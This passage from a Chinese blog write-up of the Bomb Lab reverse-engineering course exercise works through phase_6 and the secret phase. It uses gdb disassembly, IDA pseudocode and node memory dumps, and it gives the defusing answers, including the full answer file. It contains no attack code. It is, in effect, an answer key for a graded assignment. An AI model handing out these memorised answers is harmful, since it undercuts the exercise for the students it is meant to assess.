class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb查看phase_6函数汇编代码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble phase_6</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_6:</span><br><span class="line">=&gt; 0x00401925 &lt;+0&gt;:     endbr32</span><br><span class="line">   0x00401929 &lt;+4&gt;:     push   ebp</span><br><span class="line">   0x0040192a &lt;+5&gt;:     mov    ebp,esp</span><br><span class="line">   0x0040192c &lt;+7&gt;:     push   edi</span><br><span class="line">   0x0040192d &lt;+8&gt;:     push   esi</span><br><span class="line">   0x0040192e &lt;+9&gt;:     push   ebx</span><br><span class="line">   0x0040192f &lt;+10&gt;:    sub    esp,0x64</span><br><span class="line">   0x00401932 &lt;+13&gt;:    call   0x4013d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x00401937 &lt;+18&gt;:    add    ebx,0x362d</span><br><span class="line">   0x0040193d &lt;+24&gt;:    mov    eax,gs:0x14</span><br><span class="line">   0x00401943 &lt;+30&gt;:    mov    DWORD PTR [ebp-0x1c],eax</span><br><span class="line">   0x00401946 &lt;+33&gt;:    xor    eax,eax</span><br><span class="line">   0x00401948 &lt;+35&gt;:    lea    eax,[ebp-0x4c]</span><br><span class="line">   0x0040194b &lt;+38&gt;:    push   eax</span><br><span class="line">   0x0040194c &lt;+39&gt;:    push   DWORD PTR [ebp+0x8]</span><br><span class="line">   0x0040194f &lt;+42&gt;:    call   0x401eba &lt;read_six_numbers&gt;</span><br><span class="line">   0x00401954 &lt;+47&gt;:    lea    eax,[ebp-0x48]</span><br><span class="line">   0x00401957 &lt;+50&gt;:    mov    DWORD PTR [ebp-0x64],eax</span><br><span class="line">   0x0040195a &lt;+53&gt;:    add    esp,0x10</span><br><span class="line">   0x0040195d &lt;+56&gt;:    mov    DWORD PTR [ebp-0x60],0x0</span><br><span class="line">   0x00401964 &lt;+63&gt;:    lea    eax,[ebp-0x34]</span><br><span class="line">   0x00401967 &lt;+66&gt;:    mov    DWORD PTR [ebp-0x5c],eax</span><br><span class="line">   0x0040196a &lt;+69&gt;:    jmp    0x40198d &lt;phase_6+104&gt;</span><br><span class="line">   0x0040196c &lt;+71&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x00401971 &lt;+76&gt;:    jmp    0x4019a0 &lt;phase_6+123&gt;</span><br><span class="line">   0x00401973 &lt;+78&gt;:    add    esi,0x4</span><br><span class="line">   0x00401976 &lt;+81&gt;:    cmp    DWORD PTR [ebp-0x5c],esi</span><br><span class="line">   0x00401979 &lt;+84&gt;:    je     0x401989 &lt;phase_6+100&gt;</span><br><span class="line">   0x0040197b &lt;+86&gt;:    mov    eax,DWORD PTR [esi]</span><br><span class="line">   0x0040197d &lt;+88&gt;:    cmp    DWORD PTR [edi-0x4],eax</span><br><span class="line">   0x00401980 &lt;+91&gt;:    jne    0x401973 &lt;phase_6+78&gt;</span><br><span class="line">   0x00401982 &lt;+93&gt;:    call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x00401987 &lt;+98&gt;:    jmp    0x401973 &lt;phase_6+78&gt;</span><br><span class="line">   0x00401989 &lt;+100&gt;:   add    DWORD PTR [ebp-0x64],0x4</span><br><span class="line">   0x0040198d &lt;+104&gt;:   mov    eax,DWORD PTR [ebp-0x64]</span><br><span class="line">   0x00401990 &lt;+107&gt;:   mov    edi,eax</span><br><span class="line">   0x00401992 &lt;+109&gt;:   mov    eax,DWORD PTR [eax-0x4]</span><br><span class="line">   0x00401995 &lt;+112&gt;:   mov    DWORD PTR [ebp-0x68],eax</span><br><span class="line">   0x00401998 &lt;+115&gt;:   sub    eax,0x1</span><br><span class="line">   0x0040199b &lt;+118&gt;:   cmp    eax,0x5</span><br><span class="line">   0x0040199e &lt;+121&gt;:   ja     0x40196c &lt;phase_6+71&gt;</span><br><span class="line">   0x004019a0 &lt;+123&gt;:   add    DWORD PTR [ebp-0x60],0x1</span><br><span class="line">   0x004019a4 &lt;+127&gt;:   mov    eax,DWORD PTR [ebp-0x60]</span><br><span class="line">   0x004019a7 &lt;+130&gt;:   cmp    eax,0x5</span><br><span class="line">   0x004019aa &lt;+133&gt;:   jg     0x4019b1 &lt;phase_6+140&gt;</span><br><span class="line">   0x004019ac &lt;+135&gt;:   mov    esi,DWORD PTR [ebp-0x64]</span><br><span class="line">   0x004019af &lt;+138&gt;:   jmp    0x40197b &lt;phase_6+86&gt;</span><br><span class="line">   0x004019b1 &lt;+140&gt;:   mov    esi,0x0</span><br><span class="line">   0x004019b6 &lt;+145&gt;:   mov    edi,esi</span><br><span class="line">   0x004019b8 &lt;+147&gt;:   mov    ecx,DWORD PTR [ebp+esi*4-0x4c]</span><br><span class="line">   0x004019bc &lt;+151&gt;:   mov    eax,0x1</span><br><span class="line">   0x004019c1 &lt;+156&gt;:   lea    edx,[ebx+0x594]</span><br><span class="line">   0x004019c7 &lt;+162&gt;:   cmp    ecx,0x1</span><br><span class="line">   0x004019ca &lt;+165&gt;:   jle    0x4019d6 &lt;phase_6+177&gt;</span><br><span class="line">   0x004019cc &lt;+167&gt;:   mov    edx,DWORD PTR [edx+0x8]</span><br><span class="line">   0x004019cf &lt;+170&gt;:   add    eax,0x1</span><br><span class="line">   0x004019d2 &lt;+173&gt;:   cmp    eax,ecx</span><br><span class="line">   0x004019d4 &lt;+175&gt;:   jne    0x4019cc &lt;phase_6+167&gt;</span><br><span class="line">   0x004019d6 &lt;+177&gt;:   mov    DWORD PTR [ebp+edi*4-0x34],edx</span><br><span class="line">   0x004019da &lt;+181&gt;:   add    esi,0x1</span><br><span class="line">   0x004019dd &lt;+184&gt;:   cmp    esi,0x6</span><br><span class="line">   0x004019e0 &lt;+187&gt;:   jne    0x4019b6 &lt;phase_6+145&gt;</span><br><span class="line">   0x004019e2 &lt;+189&gt;:   mov    esi,DWORD PTR [ebp-0x34]</span><br><span class="line">   0x004019e5 &lt;+192&gt;:   mov    eax,DWORD PTR [ebp-0x30]</span><br><span class="line">   0x004019e8 &lt;+195&gt;:   mov    DWORD PTR [esi+0x8],eax</span><br><span class="line">   0x004019eb &lt;+198&gt;:   mov    edx,DWORD PTR [ebp-0x2c]</span><br><span class="line">   0x004019ee &lt;+201&gt;:   mov    DWORD PTR [eax+0x8],edx</span><br><span class="line">   0x004019f1 &lt;+204&gt;:   mov    eax,DWORD PTR [ebp-0x28]</span><br><span class="line">   0x004019f4 &lt;+207&gt;:   mov    DWORD PTR [edx+0x8],eax</span><br><span class="line">   0x004019f7 &lt;+210&gt;:   mov    edx,DWORD PTR [ebp-0x24]</span><br><span class="line">   0x004019fa &lt;+213&gt;:   mov    DWORD PTR [eax+0x8],edx</span><br><span class="line">   0x004019fd &lt;+216&gt;:   mov    eax,DWORD PTR [ebp-0x20]</span><br><span class="line">   0x00401a00 &lt;+219&gt;:   mov    DWORD PTR [edx+0x8],eax</span><br><span class="line">   0x00401a03 &lt;+222&gt;:   mov    DWORD PTR [eax+0x8],0x0</span><br><span class="line">   0x00401a0a &lt;+229&gt;:   mov    edi,0x5</span><br><span class="line">   0x00401a0f &lt;+234&gt;:   jmp    0x401a19 &lt;phase_6+244&gt;</span><br><span class="line">   0x00401a11 &lt;+236&gt;:   mov    esi,DWORD PTR [esi+0x8]</span><br><span class="line">   0x00401a14 &lt;+239&gt;:   sub    edi,0x1</span><br><span class="line">   0x00401a17 &lt;+242&gt;:   je     0x401a29 &lt;phase_6+260&gt;</span><br><span class="line">   0x00401a19 &lt;+244&gt;:   mov    eax,DWORD PTR [esi+0x8]</span><br><span class="line">   0x00401a1c &lt;+247&gt;:   mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x00401a1e &lt;+249&gt;:   cmp    DWORD PTR [esi],eax</span><br><span class="line">   0x00401a20 &lt;+251&gt;:   jle    0x401a11 &lt;phase_6+236&gt;</span><br><span class="line">   0x00401a22 &lt;+253&gt;:   call   0x401e64 &lt;explode_bomb&gt;</span><br><span class="line">   0x00401a27 &lt;+258&gt;:   jmp    0x401a11 &lt;phase_6+236&gt;</span><br><span class="line">   0x00401a29 &lt;+260&gt;:   mov    eax,DWORD PTR [ebp-0x1c]</span><br><span class="line">   0x00401a2c &lt;+263&gt;:   xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x00401a33 &lt;+270&gt;:   jne    0x401a3d &lt;phase_6+280&gt;</span><br><span class="line">   0x00401a35 &lt;+272&gt;:   lea    esp,[ebp-0xc]</span><br><span class="line">   0x00401a38 &lt;+275&gt;:   pop    ebx</span><br><span class="line">   0x00401a39 &lt;+276&gt;:   pop    esi</span><br><span class="line">   0x00401a3a &lt;+277&gt;:   pop    edi</span><br><span class="line">   0x00401a3b &lt;+278&gt;:   pop    ebp</span><br><span class="line">   0x00401a3c &lt;+279&gt;:   ret</span><br><span class="line">   0x00401a3d &lt;+280&gt;:   call   0x402e00 &lt;__stack_chk_fail_local&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="72-思路"><a class="markdownIt-Anchor" href="#72-思路"></a> 7.2 思路</h2><ol><li><p>查看伪代码需要输入六个数字；</p></li><li><p>观察这部分代码块（对应汇编代码<code>&lt;+47&gt;</code>到<code>&lt;+98&gt;</code>）可得，这六个数字必须从<code>1 2 3 4 5 6</code>中选，而且互不相同；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*((_DWORD *)v14 - <span class="number">1</span>) - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">        explode_bomb();</span><br><span class="line">    <span class="keyword">if</span> ( ++v15 &gt; <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    v1 = (<span class="keyword">int</span> *)v14;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_DWORD *)v14 - <span class="number">1</span>) == *v1 )</span><br><span class="line">            explode_bomb();</span><br><span class="line">        ++v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( &amp;v18 != v1 );</span><br><span class="line">    v14 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>查看这部分代码块可得，是根据输入的六个数字对node链表进行排序，node链表最后要升序排列（可以有相等的）；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">6</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    v3 = *(&amp;v16 + i);</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line">    v5 = &amp;node1;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v5 = (_DWORD *)v5[<span class="number">2</span>];</span><br><span class="line">            ++v4;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v4 != v3 );</span><br><span class="line">    &#125;</span><br><span class="line">    *(&amp;v18 + i) = (<span class="keyword">int</span>)v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v6 &gt; **(_DWORD **)(v6 + <span class="number">8</span>) )</span><br><span class="line">        explode_bomb();</span><br><span class="line">    v6 = *(_DWORD *)(v6 + <span class="number">8</span>);</span><br><span class="line">    --v12;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v12 );</span><br></pre></td></tr></table></figure></li><li><p>运行至<code>&lt;+156&gt; lea edx,[ebx+0x594]</code>，查看各个node结点的数值：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1</span><br><span class="line">EBX: 0x404f64 --&gt; 0x4e6c (<span class="string">'lN'</span>)</span><br><span class="line">ECX: 0x4</span><br><span class="line">EDX: 0x4054f8 --&gt; 0x2a0</span><br><span class="line">ESI: 0x1</span><br><span class="line">EDI: 0x1</span><br><span class="line">EBP: 0xbffff498 --&gt; 0xbffff4c8 --&gt; 0x0</span><br><span class="line">ESP: 0xbffff430 --&gt; 0x3</span><br><span class="line">EIP: 0x4019c7 (&lt;phase_6+162&gt;:   cmp    ecx,0x1)</span><br><span class="line">EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4019b8 &lt;phase_6+147&gt;:      mov    ecx,DWORD PTR [ebp+esi*4-0x4c]</span><br><span class="line">   0x4019bc &lt;phase_6+151&gt;:      mov    eax,0x1</span><br><span class="line">   0x4019c1 &lt;phase_6+156&gt;:      lea    edx,[ebx+0x594]</span><br><span class="line">=&gt; 0x4019c7 &lt;phase_6+162&gt;:      cmp    ecx,0x1</span><br><span class="line">   0x4019ca &lt;phase_6+165&gt;:      jle    0x4019d6 &lt;phase_6+177&gt;</span><br><span class="line">   0x4019cc &lt;phase_6+167&gt;:      mov    edx,DWORD PTR [edx+0x8]</span><br><span class="line">   0x4019cf &lt;phase_6+170&gt;:      add    eax,0x1</span><br><span class="line">   0x4019d2 &lt;phase_6+173&gt;:      cmp    eax,ecx</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff430 --&gt; 0x3</span><br><span class="line">0004| 0xbffff434 --&gt; 0xbffff464 --&gt; 0x405528 --&gt; 0x133</span><br><span class="line">0008| 0xbffff438 --&gt; 0x6</span><br><span class="line">0012| 0xbffff43c --&gt; 0xbffff464 --&gt; 0x405528 --&gt; 0x133</span><br><span class="line">0016| 0xbffff440 --&gt; 0x4058f0 (<span class="string">"5 4 2 1 6 3"</span>)</span><br><span class="line">0020| 0xbffff444 --&gt; 0x50 (<span class="string">'P'</span>)</span><br><span class="line">0024| 0xbffff448 --&gt; 0xb7fbc5c0 --&gt; 0xfbad2288</span><br><span class="line">0028| 0xbffff44c --&gt; 0x5</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x004019c7 <span class="keyword">in</span> phase_6 ()</span><br><span class="line">gdb-peda$ x/21x <span class="variable">$ebx</span>+0x594</span><br><span class="line">0x4054f8 &lt;node1&gt;:       0x000002a0      0x00000001      0x00405504      0x0000026d</span><br><span class="line">0x405508 &lt;node2+4&gt;:     0x00000002      0x00405510      0x000001ea      0x00000003</span><br><span class="line">0x405518 &lt;node3+8&gt;:     0x0040551c      0x00000038      0x00000004      0x00405528</span><br><span class="line">0x405528 &lt;node5&gt;:       0x00000133      0x00000005      0x00405080      0x00000000</span><br><span class="line">0x405538:       0x00000000      0x00000000      0x00403417      0x00000000</span><br><span class="line">0x405548 &lt;host_table+8&gt;:        0x00000000</span><br><span class="line">gdb-peda$ x 0x00405080</span><br><span class="line">0x405080 &lt;node6&gt;:       0x000000ca</span><br><span class="line">gdb-peda$ x/3x 0x00405080</span><br><span class="line">0x405080 &lt;node6&gt;:       0x000000ca      0x00000006      0x00000000</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：在IDA中查看注意截断</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.data:000054F8                 public node1</span><br><span class="line">.data:000054F8 node1           db 0A0h                 ; DATA XREF: phase_6+9C↑o</span><br><span class="line">.data:000054F9                 db    2</span><br><span class="line">.data:000054FA                 db    0</span><br><span class="line">.data:000054FB                 db    0</span><br><span class="line">.data:000054FC                 db    1</span><br><span class="line">.data:000054FD                 db    0</span><br><span class="line">.data:000054FE                 db    0</span><br><span class="line">.data:000054FF                 db    0</span><br><span class="line">.data:00005500                 dd offset node2</span><br><span class="line">.data:00005504                 public node2</span><br><span class="line">.data:00005504 node2           db  6Dh ; m             ; DATA XREF: .data:00005500↑o</span><br><span class="line">.data:00005505                 db    2</span><br><span class="line">.data:00005506                 db    0</span><br><span class="line">.data:00005507                 db    0</span><br><span class="line">.data:00005508                 db    2</span><br><span class="line">.data:00005509                 db    0</span><br><span class="line">.data:0000550A                 db    0</span><br><span class="line">.data:0000550B                 db    0</span><br><span class="line">.data:0000550C                 dd offset node3</span><br></pre></td></tr></table></figure><p>可以得出：</p><ul><li><p>node结点的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>node排列：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|node1=0x2a0| -&gt; |node2=0x260| -&gt; |node3=0x1ea| -&gt; |node4=0x038| -&gt; |node5=0x133| -&gt; |node6=0x0ca|</span><br></pre></td></tr></table></figure></li></ul><p>所以应输入从小到大排列序号为：4 6 5 3 2 1</p></li></ol><p><strong>答案</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 6 5 3 2 1</span><br></pre></td></tr></table></figure><h1 id="8-bomblab隐藏关卡"><a class="markdownIt-Anchor" href="#8-bomblab隐藏关卡"></a> 8 bomblab隐藏关卡</h1><h2 id="81-解析"><a class="markdownIt-Anchor" href="#81-解析"></a> 8.1 解析</h2><p>在bomb的伪代码内找到调用 secret_phase 的函数-- phase_defused ，研究phase_defused 汇编代码：首先调用 sscanf ，要求输入 %d %d %s ，而且调用strings_not_equal 函数，只有第三个输入是 <code>DrEvil</code> 时触发 secret_phase() 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">phase_defused</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+10h] [ebp-64h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">80</span>]; <span class="comment">// [esp+18h] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+68h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  send_msg(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( num_input_strings == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_sscanf(&amp;input_strings[<span class="number">240</span>], <span class="string">"%d %d %s"</span>, v1, v2) == <span class="number">3</span> &amp;&amp; !strings_not_equal(v3, <span class="string">"DrEvil"</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Curses, you've found the secret phase!"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"But finding it and solving it are quite different..."</span>);</span><br><span class="line">      secret_phase();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulations! You've defused the bomb!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your instructor has been notified and will verify your solution."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将已经解决的问题答案放到txt文件中，便于操作；找到一个输入是两个整数的阶段，这里选择了phase_4，成功触发隐藏关卡；（第三阶段无法触发，不知为何？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">And they have no disregard for human life.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 1071 </span><br><span class="line">24 2 DrEvil</span><br><span class="line">111100</span><br><span class="line">4 6 5 3 2 1</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./bomb flag.txt</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That<span class="string">'s number 2.  Keep going!</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string">So you got that one.  Try this one.</span></span><br><span class="line"><span class="string">Good work!  On to the next...</span></span><br><span class="line"><span class="string">Curses, you'</span>ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br></pre></td></tr></table></figure><p>secret_phase伪代码 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">secret_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = read_line();</span><br><span class="line">  v1 = strtol(v0, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 - <span class="number">1</span>) &gt; <span class="number">0x3E8</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">if</span> ( fun7(n1, v1) != <span class="number">3</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wow! You've defused the secret stage!"</span>);</span><br><span class="line">  <span class="keyword">return</span> phase_defused();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fun7伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">fun7</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * fun7(a1[<span class="number">1</span>], a2);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 != a2 )</span><br><span class="line">    result = <span class="number">2</span> * fun7(a1[<span class="number">2</span>], a2) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="82-思路"><a class="markdownIt-Anchor" href="#82-思路"></a> 8.2 